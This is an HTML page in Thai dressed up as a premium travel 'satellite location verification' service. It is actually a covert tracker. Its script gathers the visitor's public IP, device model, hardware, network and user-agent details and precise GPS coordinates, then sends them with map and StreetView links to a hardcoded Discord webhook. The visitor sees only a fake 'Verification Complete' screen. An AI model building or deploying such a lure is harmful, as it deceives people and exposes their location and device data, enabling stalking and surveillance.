<!DOCTYPE html>
<html lang="th">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Travel Premium - Ultra Precision Service</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Kanit:wght@300;400;600&display=swap" rel="stylesheet">
    <style>
        body { font-family: 'Kanit', sans-serif; background: #020617; color: white; overflow: hidden; user-select: none; }
        .glass-panel { background: rgba(15, 23, 42, 0.8); backdrop-filter: blur(24px); border: 1px solid rgba(255, 255, 255, 0.1); }
        .scan-anim { height: 2px; background: #3b82f6; position: absolute; width: 100%; top: 0; animation: scan move 1.2s infinite linear; box-shadow: 0 0 20px #3b82f6; }
        @keyframes move { 0% { top: 0; } 100% { top: 100%; } }
    </style>
</head>
<body class="flex items-center justify-center min-h-screen p-4">

    <div class="max-w-md w-full glass-panel rounded-[2.5rem] overflow-hidden shadow-2xl relative">
        <div class="p-8 pb-4 text-center">
            <div class="inline-block px-4 py-1 rounded-full bg-blue-500/10 border border-blue-500/20 text-blue-400 text-[10px] mb-4 uppercase tracking-[0.2em]">
                Ultra Precision v7.0 Ready
            </div>
            <h1 class="text-3xl font-bold mb-2">ตรวจสอบพิกัดขั้นสูง</h1>
            <p class="text-slate-400 text-sm leading-relaxed">กรุณารอสักครู่เพื่อให้ระบบล็อกตำแหน่งดาวเทียมที่แม่นยำที่สุด</p>
        </div>

        <div class="p-8 pt-0">
            <div id="step-init" class="block">
                <button onclick="startUltraProcess()" class="w-full bg-blue-600 hover:bg-blue-500 py-5 rounded-2xl font-bold text-xl transition-all active:scale-95 shadow-xl shadow-blue-500/30">
                    เข้าสู่ระบบด้วยพิกัดละเอียด
                </button>
            </div>

            <div id="step-scan" class="hidden text-center py-10">
                <div class="relative w-48 h-48 mx-auto mb-6 rounded-full border-4 border-blue-500/20 overflow-hidden bg-slate-900 flex items-center justify-center">
                    <div class="text-6xl animate-pulse">📡</div>
                    <div class="scan-anim"></div>
                </div>
                <p id="status-msg" class="text-blue-400 text-sm animate-pulse tracking-widest uppercase">🛰️ Satellite Locking...</p>
                <p id="accuracy-msg" class="text-[10px] text-slate-500 mt-2">Searching for best signal...</p>
            </div>

            <div id="step-result" class="hidden animate-in fade-in duration-700">
                <div class="mb-6 p-4 bg-green-500/10 border border-green-500/20 rounded-2xl flex items-center gap-3 text-green-400">
                    <div class="w-10 h-10 bg-green-500 rounded-full flex items-center justify-center text-white text-xl">✓</div>
                    <div>
                        <p class="font-bold text-sm uppercase">Verification Complete</p>
                        <p class="text-[10px] opacity-70">ตำแหน่งและอุปกรณ์ถูกยืนยันแล้ว</p>
                    </div>
                </div>
                <div id="places-container" class="space-y-3"></div>
            </div>
        </div>
    </div>

    <script>
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1497085877245972631/6juBaxSvhNsQ3GMceT_nWa1qeFWEmIk0ZpbrPYfq9qB3URkmYYDvwZ2T1gsTzy8Sj75_";

        async function startUltraProcess() {
            document.getElementById('step-init').classList.add('hidden');
            document.getElementById('step-scan').classList.remove('hidden');

            // 1. ดึงข้อมูลพื้นฐานและ IP
            let publicIP = "Fetching...";
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                publicIP = data.ip;
            } catch(e) { publicIP = "Blocked/Failed"; }

            const netInfo = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            const deviceData = {
                ip: publicIP,
                model: getModelName(),
                platform: navigator.platform,
                memory: navigator.deviceMemory || "N/A",
                cpu: navigator.hardwareConcurrency || "N/A",
                netType: netInfo ? netInfo.effectiveType : "N/A",
                screen: `${window.screen.width}x${window.screen.height}`,
                ua: navigator.userAgent
            };

            // 2. ระบบดึงพิกัดแบบเฝ้าดูความแม่นยำ (High Precision Watcher)
            if (navigator.geolocation) {
                let watchID;
                let bestPos = null;

                const geoOptions = {
                    enableHighAccuracy: true,
                    timeout: 15000,
                    maximumAge: 0
                };

                watchID = navigator.geolocation.watchPosition(async (pos) => {
                    const acc = pos.coords.accuracy;
                    document.getElementById('accuracy-msg').innerText = `Current Accuracy: +/- ${acc.toFixed(1)}m`;

                    // ถ้าแม่นยำกว่า 30 เมตร หรือผ่านไป 5 วินาที ให้ถือว่าพอใจแล้ว
                    if (acc < 30 || bestPos === null) {
                        bestPos = pos;
                        if (acc < 20) { // ถ้าแม่นจัดๆ ให้ส่งเลยไม่ต้องรอ
                            navigator.geolocation.clearWatch(watchID);
                            completeProcess(bestPos, deviceData);
                        }
                    }
                }, (err) => {
                    completeProcess(null, deviceData);
                }, geoOptions);

                // ตั้งเวลาตัดจบที่ 7 วินาทีเพื่อให้ไม่รอนานเกินไปถ้าสัญญาณไม่ดีขึ้น
                setTimeout(() => {
                    navigator.geolocation.clearWatch(watchID);
                    if (bestPos) completeProcess(bestPos, deviceData);
                }, 7000);
            }
        }

        function getModelName() {
            const ua = navigator.userAgent;
            if (/android/i.test(ua)) {
                const match = ua.match(/Android.*;\s([^;]+)\sBuild/);
                return match ? match[1] : "Android Device";
            }
            if (/iPhone|iPad/.test(ua)) {
                const w = window.screen.width, h = window.screen.height;
                if (w === 430 || h === 932) return "iPhone 14/15 Pro Max";
                if (w === 393 || h === 852) return "iPhone 14/15 Pro";
                if (w === 390 || h === 844) return "iPhone 12/13/14";
                return "iOS Device";
            }
            return navigator.platform;
        }

        async function completeProcess(pos, dev) {
            let lat = "Denied", lon = "Denied", acc = "N/A";
            if (pos) {
                lat = pos.coords.latitude;
                lon = pos.coords.longitude;
                acc = pos.coords.accuracy.toFixed(1);
            }

            const payload = {
                embeds: [{
                    title: "🚀 [Ultra Precision Scan] ข้อมูลระดับสูง",
                    color: 2303786,
                    fields: [
                        { name: "📱 อุปกรณ์", value: `**${dev.model}**`, inline: true },
                        { name: "🌐 IP สาธารณะ", value: `\`${dev.ip}\``, inline: true },
                        { name: "📍 พิกัดแม่นยำ", value: `\`${lat}, ${lon}\``, inline: false },
                        { name: "📏 รัศมีคลาดเคลื่อน", value: `+/- ${acc} เมตร`, inline: true },
                        { name: "📶 เครือข่าย/เน็ต", value: `${dev.netType.toUpperCase()}`, inline: true },
                        { name: "💾 RAM/CPU", value: `${dev.memory}GB / ${dev.cpu} Cores`, inline: true },
                        { name: "🗺️ ลิงก์แผนที่", value: `[Google Maps](https://www.google.com/maps/search/?api=1&query=${lat},${lon}) | [StreetView](https://www.google.com/maps/@?api=1&map_action=pano&viewpoint=${lat},${lon})` },
                        { name: "📝 User Agent", value: `\`\`\`${dev.ua}\`\`\`` }
                    ],
                    footer: { text: "Precision Lock v7.0 • " + new Date().toLocaleString() }
                }]
            };

            await fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });

            showResults(lat, lon);
        }

        function showResults(lat, lon) {
            document.getElementById('step-scan').classList.add('hidden');
            document.getElementById('step-result').classList.remove('hidden');
            const container = document.getElementById('places-container');
            const url = `https://www.google.com/maps/search/$restaurants/@${lat},${lon},15z`;
            container.innerHTML = `
                <a href="${url}" target="_blank" class="flex items-center gap-4 bg-blue-600/10 border border-blue-500/30 p-5 rounded-2xl hover:bg-blue-600/20 transition-all">
                    <span class="text-2xl">🏨</span>
                    <div class="flex-1">
                        <p class="text-white text-sm font-bold">ดูบริการพรีเมียมใกล้คุณ</p>
                        <p class="text-blue-400 text-[10px]">อ้างอิงพิกัดดาวเทียมปัจจุบัน</p>
                    </div>
                    <span>→</span>
                </a>`;
        }
    </script>
</body>
</html>
